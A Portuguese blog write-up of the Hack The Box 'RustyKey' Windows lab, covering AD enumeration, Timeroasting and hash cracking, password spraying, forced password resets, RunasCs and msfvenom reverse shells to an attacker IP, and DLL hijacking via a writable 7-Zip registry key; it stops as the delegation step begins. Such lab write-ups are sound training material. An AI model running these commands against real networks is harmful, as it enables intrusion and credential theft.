---
title: "RustyKey - HTB"
date: 2025-11-08
summary: "As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A"
layout: "single"
tags: ["Windows", "Hard", "HTB"]
---

## Resumo

A Rustykey é uma máquina de nível Hard que contém uma cadeia de ataques interessantes. Iniciamos com um usuário no Active Directory que nos permitiu enumerar o AD completamente, o que nos levou a um ataque de `Timeroasting` devido a várias contas de máquinas no AD. Após obtermos uma conta privilegiada no AD, conseguimos nos adicionarmos em um grupo que possuia permissão de `ForceChangePassword` sobre dois usuários. Após obter esses usuários, encontramos um PDF que nos levou a um ataque de DLL hijacking, o que permitiu obter mais um usuário privilegiado. E por fim, abusamos de um RCBD que permitia impersonar qualquer usuário do AD.

Essa é uma máquina bastante desafiadora e interessante. Ela fornece diversos aprendizados e práticas que encontramos em vários outros CTFs de Active Directory.


## Recon inicial

Como sempre em todo CTF, estarei iniciando o scan de portas na máquina. Estarei utilizando o [Rustscan](https://github.com/bee-san/RustScan) para fazer esse scan rapidamente (você pode utilizar o nmap normalmente caso prefira):
```bash
rustscan -a 10.10.11.75 -u 5000 -- -sV

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-30 02:26:27Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49730/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

{{< alert >}}
**SEMPRE que rodar o Rustscan/Nmap, adicione o domain encontrado no seu arquivo `/etc/hosts` para não ter problemas de DNS. E SEMPRE que for possível, coloque o `dc.DOMINIO.htb` ANTES do `DOMINIO.htb`.**
{{< /alert >}}


Não encontramos nenhuma porta fora do comum em ambientes Windows, então como ja iniciamos com um usuário, irei pular para a enumeração das shares do SMB. 

Ao tentar enumerar as shares vemos que a autenticação `NTLM` está desabilitada no Active Directory (autenticação com senhas), para "burlar" isso precisamos solicitar um `ticket TGT` (Ticket Granting Ticket) para conseguir nos autenticar com o Kerberos. Para fazer isso, estarei utilizando o `kinit`, porém antes disso precisamos configurar o `/etc/krb5conf`:

```bash
[realms]
    RUSTYKEY.HTB = {
                    kdc = dc.rustykey.htb
            }
```

Após essa configuração, podemos solicitar o TGT:
```bash
kinit rr.parker@RUSTYKEY.HTB
```

Para validar se o TGT gerado foi válido, podemos usar o `klist`:
```bash
> klist

Ticket cache: FILE:/tmp/krb5cc_0
Default principal: rr.parker@RUSTYKEY.HTB

Valid starting       Expires              Service principal
10/29/2025 23:38:25  10/30/2025 09:38:25  krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
        renew until 10/30/2025 23:38:21

```
{{< alert >}}
**Sempre que o NTLM do AD estiver desabilitado e precisar utilizar tickets TGT/TGS, SEMPRE UTILIZE O HOST COM `DC.DOMINIO.HTB` pois o Kerberos só trabalha com DNS!**
{{< /alert >}}

Com esse TGT, podemos finalmente acessar as shares SMB usando o [Netexec](https://www.netexec.wiki/):
```bash
nxc smb "dc.rustykey.htb" -u 'rr.parker' -p '8#t5HE8L!W3A' --shares -k

SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\rr.parker:8#t5HE8L!W3A KRB_AP_ERR_SKEW 
```

Porém nos deparamos com o erro `KRB_AP_ERR_SKEW`, esse erro sempre acontece quando o horário da sua máquina está diferente do horário do Kerberos. Tem várias maneiras de corrigir isso, no meu caso estarei usando o [Faketime](https://packages.debian.org/sid/faketime):
```bash
faketime "$(rdate -n $DC_IP -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
```

O `Faketime` irá sincronizar apenas o horário da shell atual com o horário do Kerberos. Com o horário sincronizado, podemos usar novamente o `Netexec`:
```bash
nxc smb "dc.rustykey.htb" -u 'rr.parker' -p '8#t5HE8L!W3A' --shares -k

SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
SMB         dc.rustykey.htb 445    dc               [*] Enumerated shares
SMB         dc.rustykey.htb 445    dc               Share           Permissions     Remark
SMB         dc.rustykey.htb 445    dc               -----           -----------     ------
SMB         dc.rustykey.htb 445    dc               ADMIN$                          Remote Admin
SMB         dc.rustykey.htb 445    dc               C$                              Default share
SMB         dc.rustykey.htb 445    dc               IPC$            READ            Remote IPC
SMB         dc.rustykey.htb 445    dc               NETLOGON        READ            Logon server share 
SMB         dc.rustykey.htb 445    dc               SYSVOL          READ            Logon server share 
```

Porém não encontramos nada interessante nas shares. Irei partir pra enumeração do AD, estarei usando o [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) para fazer a enumeração e gerar o zip:
```bash
bloodhound-python -d rustykey.htb -ns 10.10.11.75 -u rr.parker -p '8#t5HE8L!W3A' -k -c ALL --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: rustykey.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 16 computers
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 12 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: dc.rustykey.htb
INFO: Done in 00M 31S
INFO: Compressing output into 20251030000528_bloodhound.zip
```

Com o zip gerado, estarei utilizando o [Bloodhound-legacy](https://github.com/SpecterOps/BloodHound-Legacy) para "digerir" esse dump e gerar o gráfico visual.

## Analisando o Active Directory

### Realizando um Timeroasting para obter o IT-Computer3$

Após algum tempo analisando o AD, não encontramos nada interessante a não ser as várias contas de computadores:

![computers](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761766306/f951227a-122e-4742-b4d0-c7ed5fcd39f1.png)

O que levanta a hipótese de um ataque de [Timeroasting](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/timeroasting). Utilizando o [script](https://github.com/SecuraBV/Timeroast/blob/main/timeroast.py) do mesmo site, conseguimos as seguintes hashs:
```bash
1000:$sntp-ms$3fc8b5cffc215f72ebd3b779696baac5$1c0111e900000000000a65e24c4f434cecacd516799587bce1b8428bffbfcd0aecad5b68059da4c1ecad5b68059dc64f
1103:$sntp-ms$de79e918feba6ba77ad3ad58cd01cb37$1c0111e900000000000a65e24c4f434cecacd51679b332c7e1b8428bffbfcd0aecad5b68c5bb4c71ecad5b68c5bb6fad
1104:$sntp-ms$938aee049b64154e27f64bd3f52791e2$1c0111e900000000000a65e24c4f434cecacd5167b9f82e7e1b8428bffbfcd0aecad5b68c7a7942eecad5b68c7a7bfcd
1105:$sntp-ms$11c48527a1939d4b088d2456eb6ae77e$1c0111e900000000000a65e24c4f434cecacd516788d0d9ae1b8428bffbfcd0aecad5b68c8adb90becad5b68c8adddf4
1106:$sntp-ms$da784792e6ea12d62ebc509c03cd62a7$1c0111e900000000000a65e24c4f434cecacd5167ab5ef3ae1b8428bffbfcd0aecad5b68cad69750ecad5b68cad6c142
1107:$sntp-ms$ebd52e1657ffafb6b8da3f8277b9519c$1c0111e900000000000a65e24c4f434cecacd5167c5e8922e1b8428bffbfcd0aecad5b68cc7f3641ecad5b68cc7f597c
1118:$sntp-ms$6170b4f9ad2199ecb6e1815a54f2db34$1c0111e900000000000a65e24c4f434cecacd5167be30f2ee1b8428bffbfcd0aecad5b68e41421f5ecad5b68e41441d6
1119:$sntp-ms$75010daf1dd74db151f1af431798d79d$1c0111e900000000000a65e24c4f434cecacd5167972bcb5e1b8428bffbfcd0aecad5b68e57ad304ecad5b68e57af99b
1120:$sntp-ms$9635feeb4d92dcdc860e2e1a8a054904$1c0111e900000000000a65e24c4f434cecacd516786f9690e1b8428bffbfcd0aecad5b68e8903643ecad5b68e8906a45
1121:$sntp-ms$77129d188cb7d62d2b8a525db5c146d6$1c0111e900000000000a65e24c4f434cecacd5167a9a5d0de1b8428bffbfcd0aecad5b68eabb01c9ecad5b68eabb2d68
1122:$sntp-ms$496ca062d4994931f60819a8252519a2$1c0111e900000000000a65e24c4f434cecacd5167c405e94e1b8428bffbfcd0aecad5b68ec610350ecad5b68ec61309c
1123:$sntp-ms$ffb4b4ab380b72116688ef5342171b95$1c0111e900000000000a65e24c4f434cecacd51679f24be2e1b8428bffbfcd0aecad5b68edea04ebecad5b68edea2679
1124:$sntp-ms$1a54335d4224cf81a14b311a6836109f$1c0111e900000000000a65e24c4f434cecacd51679f32957e1b8428bffbfcd0aecad5b68edeae0b4ecad5b68edeb059c
1125:$sntp-ms$c96cc1fb895b1b093050b46858d0d1b4$1c0111e900000000000a65e24c4f434cecacd51678811b1de1b8428bffbfcd0aecad5b68f0916949ecad5b68f0918929
1126:$sntp-ms$3f1007a180067d7601177870178d3330$1c0111e900000000000a65e24c4f434cecacd51678e9721fe1b8428bffbfcd0aecad5b68f0f9c1f8ecad5b68f0f9e02b
1127:$sntp-ms$e29320686d737b188991617f060c6272$1c0111e900000000000a65e24c4f434cecacd5167905a052e1b8428bffbfcd0aecad5b68f115ee7eecad5b68f1160e5f
```

Com elas, conseguimos brutar as hashs localmente usando o `John` ou o `Hashcat` e obter a seguinte senha:
```bash
john --wordlist="/usr/share/wordlists/rockyou" hashs
Using default input encoding: UTF-8
Loaded 16 password hashes with 16 different salts (timeroast, SNTP-MS [MD4+MD5 32/64])
Will run 4 OpenMP threads
Note: Passwords longer than 9 [worst case UTF-8] to 27 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Rusty88!         (1125)     
1g 0:00:00:19 DONE (2025-10-29 16:37) 0.05020g/s 719771p/s 11332Kc/s 11332KC/s !143u143..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Nesse ponto, temos uma senha sem saber de qual usuário é. Como o ataque de `Timeroasting` é focado em contas de computadores, irei fazer um spray com as contas de máquinas. Pra isso estarei usando o `Netexec` para separar os nomes e para fazer o spray de senha:
```bash
nxc ldap "dc.rustykey.htb" -u 'rr.parker' -p '8#t5HE8L!W3A' -k --computers | awk '{print $5}'

DC$
Support-Computer1$
Support-Computer2$
Support-Computer3$
Support-Computer4$
Support-Computer5$
Finance-Computer1$
Finance-Computer2$
Finance-Computer3$
Finance-Computer4$
Finance-Computer5$
IT-Computer1$
IT-Computer2$
IT-Computer3$
IT-Computer4$
IT-Computer5$
```

Fazendo o spray, descobrimos que a senha que encontramos é do `IT-Computer3$`:
```bash
nxc ldap "dc.rustykey.htb" -u computers -p 'Rusty88!' -k

LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Support-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Support-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Support-Computer3$:Rusty88! KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Support-Computer4$:Rusty88! KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Support-Computer5$:Rusty88! KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Finance-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Finance-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Finance-Computer3$:Rusty88! KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Finance-Computer4$:Rusty88! KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Finance-Computer5$:Rusty88! KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\IT-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\IT-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\IT-Computer3$:Rusty88! 
```

E diferente do **RR.PARKER**, com esse usuário precisamos usar o `getTGT` do [Impacket](https://github.com/fortra/impacket) para solicitar o ticket TGT:
```bash
getTGT.py -dc-ip "dc.rustykey.htb" rustykey.htb/"IT-Computer3$":'Rusty88!'

Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IT-Computer3$.ccache

```

Com o TGT do **IT-Computer3$**, abrimos um novo leque de ataques que podemos fazer.

## User Flag

### Realizando um ForceChangePassword para obter o BB.MORGAN

![bb.morgan](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761776850/63aa35fa-1fb4-45ce-adb6-d5accdfb693e.png)

O nosso usuário tem permissão de `AddSelf` no grupo `HelpDesk` e, consequentemente `ForceChangePassword` nos usuários **DD.ALI, GG.ANDERSON, EE.REED e BB.MORGAN**, porém os mais interessantes aqui são o **EE.REED e o BB.MORGAN** pois eles são membros do grupo `REMOTE MANAGEMENT USERS`, o que permite acesso remoto com `Evil-Winrm`.

Então o nosso foco será o **BB.MORGAN**. Para isso primeiro temos que nos adicionarmos no grupo `HelpDesk`, estarei utilizando o [BloodyAD](https://github.com/CravateRouge/bloodyAD) para manipular o AD remotamente (caso queira uma "colinha" de comandos do `BloodyAD`, confira esse [site](https://seriotonctf.github.io/BloodyAD-Cheatsheet/)):
```bash
KRB5CCNAME='IT-Computer3$.ccache' bloodyAD --host "dc.rustykey.htb" -d "rustykey.htb" -k add groupMember "HelpDesk" 'it-computer3$'

[+] it-computer3$ added to HelpDesk

```

Agora que estamos no grupo, precisamos pedir novamente um TGT para atualizar as nossas permissões e ai podemos alterar a senha do **BB.MORGAN** usando também o `BloodyAD`. Porém ao tentar mudar a senha, nos deparamos com esse erro:
```bash
KRB5CCNAME='IT-Computer3$.ccache'  bloodyAD --host "dc.rustykey.htb" -d "rustykey.htb" -k set password 'bb.morgan' 'Password123!'

Traceback (most recent call last):
  File "/root/.local/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ^^^^^^
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/main.py", line 210, in main
    output = args.func(conn, **params)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/cli_modules/set.py", line 241, in password
    raise e
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/cli_modules/set.py", line 86, in password
    conn.ldap.bloodymodify(target, {"unicodePwd": op_list})
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/network/ldap.py", line 301, in bloodymodify
    raise err
msldap.commons.exceptions.LDAPModifyException: Password can't be changed. It may be because the oldpass provided is not valid.
You can try to use another password change protocol such as smbpasswd, server error may be more explicit.
```

Você deve estar se perguntando: "Mas por que acontece isso mesmo tendo a permissão `ForceChangePassword`?" Eu te respondo: isso ocorre porque o **BB.MORGAN** faz parte do grupo `Protected Objects`, e tudo que estiver dentro desse grupo, segundo a **Microsoft**:

>Protected accounts and groups are special objects where permissions are set and enforced via an automatic process that ensures the permissions on the objects remain consistent. These permissions remain even if you move the objects to different locations in Active Directory. If a protected object's permissions are modified, existing processes ensure that permissions are returned to their defaults quickly.

Resumidamente, são objetos importantes que não podem ser alterados facilmente, então para alterarmos a senha do **BB.MORGAN** precisamos tirar ele desse grupo. E para isso, o `BloodyAD` nos ajudará novamente:
```bash
KRB5CCNAME='IT-Computer3$.ccache'  bloodyAD --host "dc.rustykey.htb" -d "rustykey.htb" -k remove groupMember "CN=Protected Objects,CN=Users,DC=rustykey,DC=htb" "CN=IT,CN=Users,DC=rustykey,DC=htb"

[-] CN=Support,CN=Users,DC=rustykey,DC=htb removed from CN=Protected Objects,CN=Users,DC=rustykey,DC=htb
```

{{< alert >}}
**Nesse caso é sempre bom utilizar o `distinguishedname` do objeto no AD para não ter problema de encontrar o objeto. Caso não funcione, tente se adicionar no grupo novamente pois o cronjob da máquina pode ter removido.**
{{< /alert >}}


Agora ao mudarmos a senha do **BB.MORGAN**, recebemos a seguinte confirmação:

```bash
KRB5CCNAME='IT-Computer3$.ccache' bloodyAD --host "dc.rustykey.htb" -d "rustykey.htb" -k set password 'bb.morgan' 'Piroquinha123!'                                 

[+] Password changed successfully!
```

E agora é só pedirmos o TGT do **BB.MORGAN** e logar no `Evil-Winrm`:
```bash
> getTGT.py -dc-ip "dc.rustykey.htb" rustykey.htb/"bb.morgan":'Piroquinha123!'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies                                                                
                                                                                               
[*] Saving ticket in bb.morgan.ccache
----------------------------------------------
> export KRB5CCNAME=bb.morgan.ccache
----------------------------------------------
> evil-winrm -r RUSTYKEY.HTB -i dc.rustykey.htb
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> 
```

## Root Flag

### Encontrando o DLL hijacking

No desktop do **BB.MORGAN**, vemos um arquivo chamado `internal.pdf` e analisando ele, vemos a seguinte mensagem:
>Internal Memo<br>
From: bb.morgan@rustykey.htb<br>
To: support-team@rustykey.htb<br>
Subject: Support Group - Archiving Tool Access<br>
Date: Mon, 10 Mar 2025 14:35:18 +0100<br><br>
Hey team,<br>
As part of the new Support utilities rollout, extended access has been temporarily granted to allow
testing and troubleshooting of file archiving features across shared workstations.<br>
This is mainly to help streamline ticket resolution related to extraction/compression issues reported
by the Finance and IT teams. Some newer systems handle context menu actions differently, so
registry-level adjustments are expected during this phase.<br><br>
A few notes:
>- Please avoid making unrelated changes to system components while this access is active.
>- This permission change is logged and will be rolled back once the archiving utility is confirmed
stable in all environments.
>- Let DevOps know if you encounter access errors or missing shell actions.
<br><br>Thanks,
<br>BB Morgan
<br>IT Department

Analisando esse documento, temos algumas pistas:
- “extended access has been temporarily granted to allow testing and troubleshooting of file archiving features.” -> o grupo `Support` recebeu permissões ampliadas temporariamente para testar funcionalidades de compressão/extração de arquivos.

- "Some newer systems handle context menu actions differently, so registry-level adjustments are expected during this phase." -> O PDF menciona ajustes no registro relacionados ao menu de contexto.

- “Please avoid making unrelated changes to system components while this access is active.” -> Indica que alterações estão sendo feitas apenas em componentes de terceiros.

Tendo isso em mente e vasculhando a máquina, vemos que ela tem o `7-zip` instalado, então buscando por valores de registros relacionados a zip, encontramos os seguintes valores:
```bash
reg query "HKLM\SOFTWARE\Classes\CLSID" /s /f "zip"                                                                                                         
                                                                                                                                                                                              
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}                                                                                                              
    (Default)    REG_SZ    7-Zip Shell Extension                                                                                                                                              
                                                                                                                                                                                              
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32                                                                                               
    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll                                                                                                                                   
                                                                                                                                                                                              
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}                                                                                                              
    (Default)    REG_SZ    Compressed (zipped) Folder SendTo Target                                                                                                                           
    FriendlyTypeName    REG_EXPAND_SZ    @%SystemRoot%\system32\zipfldr.dll,-10226                                                                                                            
                                                                                                                                                                                              
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\DefaultIcon                                                                                                  
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll                                                                                                                           
                                                                                                                                                                                              
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\InProcServer32                                                                                               
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll                                                                                                                           
                                                                                                                                                                                              
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}
    (Default)    REG_SZ    Compressed (zipped) Folder Context Menu

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}\InProcServer32 
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}
    (Default)    REG_SZ    Compressed (zipped) Folder Right Drag Handler

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}\InProcServer32 
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\DefaultIcon
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\InProcServer32 
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}
    (Default)    REG_SZ    Compressed (zipped) Folder DropHandler

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}\InProcServer32 
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

End of search: 14 match(es) found.
```

E olhando mais a fundo o valor da DLL, vemos que o grupo `Support` tem permissão de edição dessa chave:
```bash
Get-Acl "HKLM:\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" | Format-list


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
Owner  : BUILTIN\Administrators
Group  : RUSTYKEY\Domain Users
Access : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         BUILTIN\Administrators Allow  FullControl
         CREATOR OWNER Allow  FullControl
         RUSTYKEY\Support Allow  FullControl <----
         NT AUTHORITY\SYSTEM Allow  FullControl 
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadKey
Audit  :
Sddl   : O:BAG:DUD:AI(A;CIID;KR;;;AC)(A;ID;KA;;;BA)(A;CIIOID;KA;;;CO)(A;CIID;KA;;;S-1-5-21-3316070415-896458127-4139322052-1132)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;BA)(A;CIID;KR;;;BU)
```

### Obtendo o EE.REED

Voltando para o `Bloodhound`, vemos que também temos a permissão de `ForceChangePassword` no usuário **EE.REED** e que ele faz parte do grupo `Support`:

![ee.reed](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1761776850/63aa35fa-1fb4-45ce-adb6-d5accdfb693e.png)

Então do mesmo jeito que mudamos a senha do **BB.MORGAN**, iremos mudar também a do **EE.REED**:
```bash
KRB5CCNAME='IT-Computer3$.ccache' bloodyAD --host "dc.rustykey.htb" -d "rustykey.htb" -k set password 'ee.reed' 'Piroquinha123!'

[+] Password changed successfully!
```

Porém ao tentar solicitar um TGT do **EE.REED** recebemos o seguinte erro:
```bash
getTGT.py -dc-ip "dc.rustykey.htb" rustykey.htb/"ee.reed":'Piroquinha123!'  
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
```

Então teremos que pegar shell de outra maneira. Estarei utilizando o [RunasCs](https://github.com/antonioCoco/RunasCs) de dentro da máquina para isso:

```bash
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> ./runas.exe ee.reed 'Piroquinha123!' powershell -r 10.10.14.228:4444 --force-profile

[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-2b12c42$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 5404 created in background.
```
```bash
rlwrap nc -lvnp 4444

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.75.
Ncat: Connection from 10.10.11.75:57195.
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
rustykey\ee.reed

```

{{< alert >}}
**Caso você não consiga alterar a senha dele ou iniciar uma reverse shell com o `RunasCs`, tente remover ele do grupo `Protected Objects` novamente.**
{{< /alert >}}

### Realizando o DLL hijacking para obter o MM.TURNER

Agora que estamos com o usuário e a permissão de editar a DLL que encontramos anteriormente, iremos gerar um payload de reverse shell. Estarei usando o `Msfvenom` para isso:
```bash
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.228 LPORT=5555 -f dll -o revshell.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1867 bytes
Final size of dll file: 9216 bytes
Saved as: revshell.dll
```

Salvei essa DLL na pasta `C:\Windows\Tasks\revshell.dll`, agora é só alterar o valor do registro e esperar a shell cair:
```bash
Set-ItemProperty -Path "HKLM:\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" -Name "(Default)" -Value "C:\windows\tasks\revshell.dll"
```

```bash
rlwrap nc -lvnp 5555
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.10.11.75.
Ncat: Connection from 10.10.11.75:57212.
Windows PowerShell running as user mm.turner on DC
Copyright (C) Microsoft Corporation. All rights reserved.

whoami
rustykey\mm.turner
PS C:\Windows> 
```

### Realizando o RCBD para obter o BackupAdmin

Voltando para o `Bloodhound` e analisando o **MM.TURNER**, vemos que ele faz parte do grupo `DELEGATION MANAGER` o que permite adicionarmos a permissão `msDS-AllowedToActOnBehalfOfOtherIdentity` em contas de serviços.

